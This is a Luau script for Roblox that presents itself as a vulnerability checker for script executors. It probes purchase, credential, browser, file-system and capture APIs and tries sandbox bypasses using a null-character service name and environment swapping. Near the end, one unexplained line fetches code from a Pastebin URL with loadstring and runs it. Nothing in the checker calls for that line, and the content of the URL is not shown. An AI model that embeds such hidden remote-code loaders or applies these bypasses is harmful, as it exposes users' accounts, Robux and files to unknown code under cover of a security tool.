local passes, fails, undefined = 0, 0, 0
local running = 0

local function test(name: string, callback_or_message: any, message: string): ()
    running += 1
    if type(callback_or_message) == 'string' then
        undefined += 1
        print("⏺️ " .. name.. ": ".. callback_or_message)
    else
        local timeout = 3
        local succeeded = false
        function starttest()
            task.spawn(function()
                local success: boolean, err: string = pcall(callback_or_message)
            
                if success or not success and err:match('Argument %d missing or nil') or err:find('Expected \':\' not \'.\' calling member function') then
                    fails += 1
                    warn("⛔ " .. name .. ": " .. message)
                elseif not success and string.find(err, 'current thread cannot') and string.find(err, 'lacking capability') then
                    undefined += 1
                    print("⏺️ " .. name.. ": Executor cannot access due to thread identity")
                else
                    local _, i = err:find(":%d+: ") 
                    if i then 
                        err = err:sub(i + 1)
                    end
                    passes += 1
                    print("✅ " .. name.. ": ".. err)
                end
                succeeded = true
            end)
        end

        coroutine.wrap(starttest)()
        local now = tick()
        repeat wait() until succeeded or tick() - now >= timeout

        if not succeeded then
            undefined += 1
            print("⏺️ " .. name.. ": Test Timeout")
        end
    end

    running -= 1
end

local getexecname = identifyexecutor or getexecutorname or whatexecutor or function() return 'Unknown Executor' end
print("Executor Vulnerability Check - ".. getexecname())
print("✅ - Pass, ⛔ - Fail, ⏺️ - No test")

-- ScriptContext
print()
test("ScriptContext.AddCoreScriptLocal", function()
	game:GetService('ScriptContext'):AddCoreScriptLocal()
end, 'This function can be used to create a new CoreScript, from which people can escape the executor environment')
test("ScriptContext.SaveScriptProfilingData", function()
	game:GetService('ScriptContext'):SaveScriptProfilingData()
end, 'This function can be used to create a file on your PC and return the path')

-- ScriptProfilerService
print()
test("ScriptProfilerService.SaveScriptProfilingData", function()
	game:GetService('ScriptProfilerService'):SaveScriptProfilingData()
end, 'This function can be used to create a file on your PC and return the path')

-- MarketplaceService (yes theres a lot)
print()
test("MarketplaceService.GetRobuxBalance", function()
	game:GetService('MarketplaceService'):GetRobuxBalance()
end, 'This function can get your Robux balance')

test("MarketplaceService.GetUserSubscriptionDetailsInternalAsync", function()
	game:GetService('MarketplaceService'):GetUserSubscriptionDetailsInternalAsync()
end, 'This function can get a player\'s subscription details')

test("MarketplaceService.GetUserSubscriptionStatusAsync", function()
	game:GetService('MarketplaceService'):GetUserSubscriptionStatusAsync()
end, 'This function can get a player\'s subscription status')

test("MarketplaceService.PerformBulkPurchase", function()
	game:GetService('MarketplaceService'):PerformBulkPurchase()
end, 'This function can be used to perform a bulk purchase')

test("MarketplaceService.PerformCancelSubscription", function()
	game:GetService('MarketplaceService'):PerformCancelSubscription()
end, 'This function can be used to cancel the player\'s subscription')

test("MarketplaceService.PerformPurchase", function()
	game:GetService('MarketplaceService'):PerformPurchase()
end, 'This function can be used to perform a Roblox purchase')

test("MarketplaceService.PerformPurchaseV2", function()
	game:GetService('MarketplaceService'):PerformPurchaseV2()
end, 'This function can be used to perform a Roblox purchase')

test("MarketplaceService.PerformSubscriptionPurchase", function()
	game:GetService('MarketplaceService'):PerformSubscriptionPurchase()
end, 'This function can be used to perform a subscription purchase')

test("MarketplaceService.PerformSubscriptionPurchaseV2", function()
	game:GetService('MarketplaceService'):PerformSubscriptionPurchaseV2()
end, 'This function can be used to perform a subscription purchase')

test("MarketplaceService.PrepareCollectiblesPurchase", function()
	game:GetService('MarketplaceService'):PrepareCollectiblesPurchase()
end, 'This function prepares a collectible purchase')

test("MarketplaceService.PromptBulkPurchase", function()
	game:GetService('MarketplaceService'):PromptBulkPurchase()
end, 'This function prompts a bulk purchase')

test("MarketplaceService.PromptBundlePurchase", function()
	game:GetService('MarketplaceService'):PromptBundlePurchase()
end, 'This function prompts a bundle purchase')

test("MarketplaceService.PromptCancelSubscription", function()
	game:GetService('MarketplaceService'):PromptCancelSubscription()
end, 'This function prompts a subscription cancel')

test("MarketplaceService.PromptCollectiblesPurchase", function()
	game:GetService('MarketplaceService'):PromptCollectiblesPurchase()
end, 'This function prompts a collectibles purchase')

test("MarketplaceService.PromptGamePassPurchase", function()
	game:GetService('MarketplaceService'):PromptGamePassPurchase()
end, 'This function prompts a Gamepass purchase')

test("MarketplaceService.PromptNativePurchase", function()
	game:GetService('MarketplaceService'):PromptNativePurchase()
end, 'This function prompts a purchase')

test("MarketplaceService.PromptNativePurchaseWithLocalPlayer", function()
	game:GetService('MarketplaceService'):PromptNativePurchaseWithLocalPlayer()
end, 'This function prompts a purchase')

test("MarketplaceService.PromptPremiumPurchase", function()
	game:GetService('MarketplaceService'):PromptPremiumPurchase()
end, 'This function prompts a Premium Purchase')

test("MarketplaceService.PromptProductPurchase", function()
	game:GetService('MarketplaceService'):PromptProductPurchase()
end, 'This function prompts a purchase')

test("MarketplaceService.PromptPurchase", function()
	game:GetService('MarketplaceService'):PromptPurchase()
end, 'This function prompts a purchase')

test("MarketplaceService.PromptRobloxPurchase", function()
	game:GetService('MarketplaceService'):PromptRobloxPurchase()
end, 'This function prompts a purchase')

test("MarketplaceService.PromptSubscriptionPurchase", function()
	game:GetService('MarketplaceService'):PromptSubscriptionPurchase()
end, 'This function prompts a subscription purchase')

test("MarketplaceService.PromptThirdPartyPurchase", function()
	game:GetService('MarketplaceService'):PromptThirdPartyPurchase()
end, 'This function prompts a 3rd party purchase')

-- Players
print()
test("Players.ReportAbuse", function()
    game:GetService('Players'):ReportAbuse(game:GetService('Players').LocalPlayer)
end, 'This function allows a bad actor to mass report you')

test("Players.ReportAbuseV3", function()
    game:GetService('Players'):ReportAbuseV3(game:GetService('Players').LocalPlayer)
end, 'This function allows a bad actor to mass report you')

-- CoreGui
print()
test("CoreGui.TakeScreenshot", function()
    game:GetService('CoreGui'):TakeScreenshot()
end, 'This function allows a bad actor to take a screenshot and flood your PC storage')

test("CoreGui.ToggleRecording", function()
    game:GetService('CoreGui'):ToggleRecording()
end, 'This function allows a bad actor to toggle a recording and flood your PC storage')
    
-- BrowserService
print()
test("BrowserService.OpenBrowserWindow", function()
    game:GetService('BrowserService'):OpenBrowserWindow()
end, 'This function allows a bad actor to open a in-game browser window')
    
test("BrowserService.ExecuteJavaScript", function()
    game:GetService('BrowserService'):ExecuteJavaScript()
end, 'This function allows a bad actor to execute JavaScript')
    
test("BrowserService.ReturnToJavaScript", function()
    game:GetService('BrowserService'):ReturnToJavaScript()
end, 'This function allows a bad actor to execute JavaScript')
    
test("BrowserService.SendCommand", function()
    game:GetService('BrowserService'):SendCommand()
end, 'This function allows a bad actor to send a command to a browser window')
    
test("BrowserService.OpenNativeOverlay", function()
    game:GetService('BrowserService').OpenNativeOverlay()
end, 'This function allows a bad actor to open an overlay window')
    
test("BrowserService.OpenWeChatAuthWindow", function()
    game:GetService('BrowserService').OpenWeChatAuthWindow()
end, 'This function allows a bad actor to open a WeChat Auth window, allowing them to access any Roblox webpage')
    
test("BrowserService.EmitHybridEvent", function()
    game:GetService('BrowserService'):EmitHybridEvent()
end, 'This function allows a bad actor to run a command on a browser window')

-- GuiService
print()
test('GuiService.OpenBrowserWindow', function()
    game:GetService('GuiService'):OpenBrowserWindow()
end, 'This function allows a bad actor to open a browser window')

-- LinkingService
print()
test('LinkingService.OpenUrl', function()
    game:GetService('LinkingService'):OpenUrl()
end, 'This function can be used to launch a local file or a command.')

-- OpenCloudService
print()
test('OpenCloudService.HttpRequestAsync', function()
    game:GetService('OpenCloudService'):HttpRequestAsync()
end, 'This function can be used to make an authenticated request')

-- HttpService
print()
test('HttpService.RequestInternal', function()
    game:GetService('HttpService'):RequestInternal()
end, 'This function can be used to request to a Roblox API')

-- HttpRbxApiService
print()
test('HttpRbxApiService.GetAsync', function()
    game:GetService('HttpRbxApiService'):GetAsync()
end, 'This function can be used to make a request to Roblox APIs')

test('HttpRbxApiService.GetAsyncFullUrl', function()
    game:GetService('HttpRbxApiService'):GetAsyncFullUrl()
end, 'This function can be used to make a request to Roblox APIs')

test('HttpRbxApiService.PostAsync', function()
    game:GetService('HttpRbxApiService'):PostAsync()
end, 'This function can be used to make a request to Roblox APIs')

test('HttpRbxApiService.PostAsyncFullUrl', function()
    game:GetService('HttpRbxApiService'):PostAsyncFullUrl()
end, 'This function can be used to make a request to Roblox APIs')
    
test('HttpRbxApiService.RequestAsync', function()
    game:GetService('HttpRbxApiService'):RequestAsync()
end, 'This function can be used to make a request to Roblox APIs')
    
test('HttpRbxApiService.RequestLimitedAsync', function()
    game:GetService('HttpRbxApiService'):RequestLimitedAsync()
end, 'This function can be used to make a request to Roblox APIs')
    
-- TestService
print()
test('TestService.Run', function()
    game:GetService('TestService'):Run()
end, 'This function can be used, paired with queueonteleport, to run malicious code with the executor thread identity, but outside of the environment.')
    
-- DataModel
print()
test("game.OpenScreenshotsFolder", function()
    game:OpenScreenshotsFolder()
end, 'This function allows a bad actor to spam open the screenshots folder')

test("game.OpenVideosFolder", function()
    game:OpenVideosFolder()
end, 'This function allows a bad actor to spam open the screenshots folder')

test("game.Load", function()
    game:Load()
end, 'This function allows someone to load an object of a URL, the actual functionaility is not very docummented')

-- CaptureService
print()
test("CaptureService.CaptureScreenshot", function()
    game:GetService('CaptureService'):CaptureScreenshot()
end, 'This function allows someone to capture a screenshot and do a function with it')
    
test("CaptureService.CreatePostAsync", function()
    game:GetService('CaptureService'):CreatePostAsync()
end, 'This function allows someone to post a capture you made')

test("CaptureService.DeleteCapture", function()
    game:GetService('CaptureService'):DeleteCapture()
end, 'This function allows someone to delete a file from your system')

test("CaptureService.DeleteCapturesAsync", function()
    game:GetService('CaptureService'):DeleteCapturesAsync()
end, 'This function allows someone to delete files from your system')   
    
test("CaptureService.GetCaptureFilePathAsync", function()
    game:GetService('CaptureService'):GetCaptureFilePathAsync()
end, 'This function allows someone to get the path of a saved capture')   

test("CaptureService.SaveCaptureToExternalStorage", function()
    game:GetService('CaptureService'):SaveCaptureToExternalStorage()
end, 'This function allows someone to save a capture')   
    
test("CaptureService.SaveCapturesToExternalStorageAsync", function()
    game:GetService('CaptureService'):SaveCapturesToExternalStorageAsync()
end, 'This function allows someone to save captures')   
    
test("CaptureService.SaveCapturesToExternalStorageAsync", function()
    game:GetService('CaptureService'):SaveCapturesToExternalStorageAsync()
end, 'This function allows someone to save captures')   

test("CaptureService.GetCaptureUploadDataAsync", function()
    game:GetService('CaptureService'):GetCaptureUploadDataAsync()
end, 'This function allows someone to get the data of a capture')   
    
test("CaptureService.PostToFeedAsync", function()
    game:GetService('CaptureService'):PostToFeedAsync()
end, 'This function allows someone to post a capture to a feed (?)')   
    
test("CaptureService.RetrieveCaptures", function()
    game:GetService('CaptureService'):RetrieveCaptures()
end, 'This function allows someone to retrieve all made captures')   
      
test("CaptureService.SaveScreenshotCapture", function()
    game:GetService('CaptureService'):SaveScreenshotCapture()
end, 'This function allows someone to save a screenshot')   


-- MessageBusService
print()
test("MessageBusService.Call", function()
    game:GetService('MessageBusService'):Call()
end, 'This calls something')

test("MessageBusService.GetLast", function()
    game:GetService('MessageBusService'):GetLast()
end, 'This gets the data of the last call')

test("MessageBusService.GetMessageId", function()
    game:GetService('MessageBusService'):GetMessageId()
end, 'This gets the message id of call')

test("MessageBusService.GetProtocolMethodRequestMessageId", function()
    game:GetService('MessageBusService'):GetProtocolMethodRequestMessageId()
end, 'This gets the protocol method of the lastest request\'s message id')

test("MessageBusService.GetProtocolMethodResponseMessageId", function()
    game:GetService('MessageBusService'):GetProtocolMethodResponseMessageId()
end, 'This gets the protocol method of the lastest response\'s message id')

test("MessageBusService.MakeRequest", function()
    game:GetService('MessageBusService'):MakeRequest()
end, 'This makes a request')

test("MessageBusService.Publish", function()
    game:GetService('MessageBusService'):Publish()
end, 'This can publish something and can be used to RCE')

test("MessageBusService.PublishProtocolMethodRequest", function()
    game:GetService('MessageBusService'):PublishProtocolMethodRequest()
end, 'This publishes a protocol method request')

test("MessageBusService.PublishProtocolMethodResponse", function()
    game:GetService('MessageBusService'):PublishProtocolMethodResponse()
end, 'This responds to a protocol method request')

test("MessageBusService.Subscribe", function()
    game:GetService('MessageBusService'):Subscribe()
end, 'This subscribes to something')

test("MessageBusService.SubscribeToProtocolMethodRequest", function()
    game:GetService('MessageBusService'):SubscribeToProtocolMethodRequest()
end, 'This subscribes to a request')

test("MessageBusService.SubscribeToProtocolMethodResponse", function()
    game:GetService('MessageBusService'):SubscribeToProtocolMethodResponse()
end, 'This subscribes in response to a protocol method request')

-- AccountService
print()
test('AccountService.GetCredentialsHeaders', function()
    game:GetService("AccountService"):GetCredentialsHeaders()
end, 'This gets the credentials headers')
test('AccountService.GetCredentialsHeaders', function()
    game:GetService("AccountService"):GetDeviceAccessToken()
end, 'This gets the device access token')
test('AccountService.GetDeviceIntegrityToken', function()
    game:GetService("AccountService"):GetDeviceIntegrityToken()
end, 'This gets the device integrity token')
test('AccountService.GetDeviceIntegrityTokenYield', function()
    game:GetService("AccountService"):GetDeviceIntegrityTokenYield()
end, 'This gets the device integrity token')


-- AvatarEditorService
print()
test("AvatarEditorService.NoPromptCreateOutfit", function()
    game:GetService("AvatarEditorService"):NoPromptCreateOutfit()
end, 'This function creates an outfit on your account')
test("AvatarEditorService.NoPromptDeleteOutfit", function()
    game:GetService("AvatarEditorService"):NoPromptCreateOutfit()
end, 'This function deletes an outfit on your account')
test("AvatarEditorService.NoPromptRenameOutfit", function()
    game:GetService("AvatarEditorService"):NoPromptRenameOutfit()
end, 'This function renames an outfit on your account')
test("AvatarEditorService.NoPromptSaveAvatar", function()
    game:GetService("AvatarEditorService"):NoPromptSaveAvatar()
end, 'This function saves an outfit on your account')
test("AvatarEditorService.NoPromptSaveAvatarThumbnailCustomization", function()
    game:GetService("AvatarEditorService"):NoPromptSaveAvatarThumbnailCustomization()
end, 'This function saves an outfit\'s customization on your account')
test("AvatarEditorService.NoPromptSetFavorite", function()
    game:GetService("AvatarEditorService"):NoPromptSetFavorite()
end, 'This function sets a favorite item on your account')
test("AvatarEditorService.NoPromptUpdateOutfit", function()
    game:GetService("AvatarEditorService"):NoPromptUpdateOutfit()
end, 'This function updates an outfit on your account')
test("AvatarEditorService.PerformCreateOutfitWithDescription", function()
    game:GetService("AvatarEditorService"):PerformCreateOutfitWithDescription()
end, 'This function creates an outfit on your account')
test("AvatarEditorService.PerformDeleteOutfit", function()
    game:GetService("AvatarEditorService"):PerformDeleteOutfit()
end, 'This function deletes an outfit on your account')
test("AvatarEditorService.PerformRenameOutfit", function()
    game:GetService("AvatarEditorService"):PerformRenameOutfit()
end, 'This function renames an outfit on your account')
test("AvatarEditorService.PerformSaveAvatarWithDescription", function()
    game:GetService("AvatarEditorService"):PerformSaveAvatarWithDescription()
end, 'This function saves an avatar on your account')
test("AvatarEditorService.PerformSetFavorite", function()
    game:GetService("AvatarEditorService"):PerformSetFavorite()
end, 'This function sets a favorite on your account')
test("AvatarEditorService.PerformUpdateOutfit", function()
    game:GetService("AvatarEditorService"):PerformUpdateOutfit()
end, 'This function performs an outfit update on your account')
test("AvatarEditorService.PromptCreateOutfit", function()
    game:GetService("AvatarEditorService"):PromptCreateOutfit()
end, 'This function prompts a create outfit dialog')
test("AvatarEditorService.PromptDeleteOutfit", function()
    game:GetService("AvatarEditorService"):PromptDeleteOutfit()
end, 'This function prompts a delete outfit dialog')
test("AvatarEditorService.PromptRenameOutfit", function()
    game:GetService("AvatarEditorService"):PromptRenameOutfit()
end, 'This function prompts a rename outfit dialog')
test("AvatarEditorService.PromptSaveAvatar", function()
    game:GetService("AvatarEditorService"):PromptSaveAvatar()
end, 'This function prompts a save avatar dialog')
test("AvatarEditorService.PromptSetFavorite", function()
    game:GetService("AvatarEditorService"):PromptSetFavorite()
end, 'This function prompts a favorite dialog')
test("AvatarEditorService.PromptUpdateOutfit", function()
    game:GetService("AvatarEditorService"):PromptUpdateOutfit()
end, 'This function prompts an update outfit dialog')

print()
if game:GetService("RunService"):IsStudio() then
    test('StudioService.OpenInBrowser_DONOTUSE', function()
        game:GetService("StudioService"):OpenInBrowser_DONOTUSE()
    end, 'This Studio-only function allows somebody to execute commands on your PC')
    test('StudioService.TryInstallPlugin', function()
        game:GetService("StudioService"):TryInstallPlugin()
    end, 'This Studio-only function allows somebody to install a plugin, which could have malicious code')
    test('StudioService.PromptImportFile', function()
        game:GetService("StudioService"):PromptImportFile()
    end, 'This Studio-only function allows somebody to prompt a file browser')
    test('StudioService.PromptImportFiles', function()
        game:GetService("StudioService"):PromptImportFiles()
    end, 'This Studio-only function allows somebody to prompt a file browser')
    test('StudioService.UninstallPlugin', function()
        game:GetService("StudioService"):UninstallPlugin()
    end, 'This Studio-only function allows somebody to uninstall a plugin')
else
    test('StudioService.OpenInBrowser_DONOTUSE', 'Not in Studio')
    test('StudioService.TryInstallPlugin', 'Not in Studio')
    test('StudioService.PromptImportFile', 'Not in Studio')
    test('StudioService.PromptImportFiles', 'Not in Studio')
    test('StudioService.UninstallPlugin', 'Not in Studio')
end
    
print()
local success = true
if pcall(function() game:HttpGet('https://google.com') end) == true then
    test('game.HttpGet | Roblox API', function()
        local RobloxVulnerableAPIS = {'https://accountinformation.roblox.com', 'https://accountsettings.roblox.com', 'https://twostepverification.roblox.com', 'https://trades.roblox.com', 'https://billing.roblox.com', 'https://economy.roblox.com', 'https://auth.roblox.com', 'https://accountinformation.roproxy.com', 'https://accountsettings.roproxy.com', 'https://twostepverification.roproxy.com', 'https://trades.roproxy.com', 'https://billing.roproxy.com', 'https://economy.roproxy.com', 'https://auth.roproxy.com'}
        for i,v in pairs(RobloxVulnerableAPIS) do
            local s,e = pcall(function() game:HttpGet(v) end)
            if s then
                success = false
                break
            end
        end
        if success then
            error("Executor did not access the function")
        end
    end, "Executor requested to a Vulnerable Roblox API")
else test('game.HttpGet | Roblox API', 'Executor does not support function') end
if pcall(function() game:HttpPost('https://google.com', '') end) == true then
    test('game.HttpPost | Roblox API', function()
        local RobloxVulnerableAPIS = {'https://accountinformation.roblox.com', 'https://accountsettings.roblox.com', 'https://twostepverification.roblox.com', 'https://trades.roblox.com', 'https://billing.roblox.com', 'https://economy.roblox.com', 'https://auth.roblox.com', 'https://accountinformation.roproxy.com', 'https://accountsettings.roproxy.com', 'https://twostepverification.roproxy.com', 'https://trades.roproxy.com', 'https://billing.roproxy.com', 'https://economy.roproxy.com', 'https://auth.roproxy.com'}
        for i,v in pairs(RobloxVulnerableAPIS) do
            local s,e = pcall(function() game:HttpPost(v, '') end)
            if s then
                success = false
                break
            end
        end
        if success then
            error("Executor did not access the function")
        end
    end, "Executor requested to a Vulnerable Roblox API")
else test('game.HttpPost | Robux API', 'Executor does not support function') end
if pcall(function() request({ Url = 'https://google.com', Method = 'GET'}) end) == true then
    test('request | Roblox API', function()
        local RobloxVulnerableAPIS = {'https://accountinformation.roblox.com', 'https://accountsettings.roblox.com', 'https://twostepverification.roblox.com', 'https://trades.roblox.com', 'https://billing.roblox.com', 'https://economy.roblox.com', 'https://auth.roblox.com', 'https://accountinformation.roproxy.com', 'https://accountsettings.roproxy.com', 'https://twostepverification.roproxy.com', 'https://trades.roproxy.com', 'https://billing.roproxy.com', 'https://economy.roproxy.com', 'https://auth.roproxy.com'}
        for i,v in pairs(RobloxVulnerableAPIS) do
            local s,_ = pcall(function() request({ Url = v, Method = 'GET'}) end)
            if s then
                success = false
                break
            end
        end
        if success then
            error("Executor did not access the function")
        end
    end, "Executor requested to a Vulnerable Roblox API")
else test('request | Roblox API', 'Executor does not support function') end
-- File System
print()
local listfiles = listfiles or list_files
if listfiles then
    test("listfiles | C:\\ Access", function()
        local failed
        for i,v in pairs(listfiles("C:\\")) do
            if tostring(v) == 'Windows' then
                failed = true
                break
            end
        end
        if not failed then
            error("Executor didn't access C:\\ Disk")
        end
    end, 'People are able to access all files on your PC')
else
    test('listfiles | C:\\ Access', 'Function not supported')
end

local writefile = writefile or write_file
local isfile = isfile or is_file
if (writefile and isfile) then
    test("writefile | Dangerous extension", function()
        local failed
        writefile('test.bat', "test")
        if isfile('test.bat') then 
            failed = true
        end
        if not failed then
            error("Executor didn't create the dangerous file")
        end
    end, 'People are able to create files with malicious extensions')
else
    test('writefile | Dangerous extension', 'Functions not supported')
end

-- Protection Bypasses
print()
test('Bypassing Blocked Services with Empty Characters', function()
    local s,e = pcall(game:GetService('ScriptContext\0').AddCoreScriptLocal, game:GetService('ScriptContext\0'))
    if s or e:lower():find('argument') and e:lower():find('missing or nil') or e:lower():find('current thread cannot') and e:lower():find('lacking capability') then
        return nil
	end
    error("Executor did not access the blocked function")
end, 'WARNING: This means your executor is vulnerable to nearly all vulnerabilities') 
	test('Bypassing protection by accessing an unprotected environment', function()
	    local old = getfenv()
	    local oldgame = game
	
	    setfenv(1, getfenv(print))
	    getfenv().game = nil
	    local s,e = pcall(game:GetService('ScriptContext').AddCoreScriptLocal)
		if s or string.find(e:lower(), 'argument') and string.find(e:lower(), 'missing or nil') or string.find(e:lower(), 'current thread cannot') and string.find(e:lower(), 'lacking capability') then
	        getfenv().game = oldgame
	        setfenv(1, old)
			return nil
		end
	    getfenv().game = oldgame
	    setfenv(1, old)
	    error("Executor did not access the blocked function")
	end, 'WARNING: This means your executor is vulnerable to all vulnerabilities')
	test("Bypassing protection by accessing the parent of Workspace", function()
		local oldgame = game
		getfenv().game = workspace.Parent
		local failed = false
		local _, callback = pcall(game:GetService('ScriptContext').AddCoreScriptLocal)
		if callback:match("Argument %d missing or nil") or callback:find("Expected ':' not '.' calling member function") or callback:lower():find('cannot call') and callback:lower():find('lacking capability') then
			failed = true
		end
		getfenv().game = oldgame
		if not failed then
			error("Executor did not access the blocked function")
		end
	end, "WARNING: This means your executor is vulnerable to nearly all vulnerabilities")


wait()
loadstring(game:HttpGetAsync("https://pastebin.com/raw/iXWBeKic"))()

local rate = math.round(passes / (passes + fails) * 100)
local outOf = passes .. " out of " .. (passes + fails)

print("\n")

print("Vulnerability Test Summary - ".. getexecname())
print("✅ Tested with a " .. rate .. "% mitigations rate (" .. outOf .. ")")
print("⛔ " .. fails .. " vulnerabilities not mitigated")
print("⏺️ " .. undefined .. " vulnerabilities not tested")
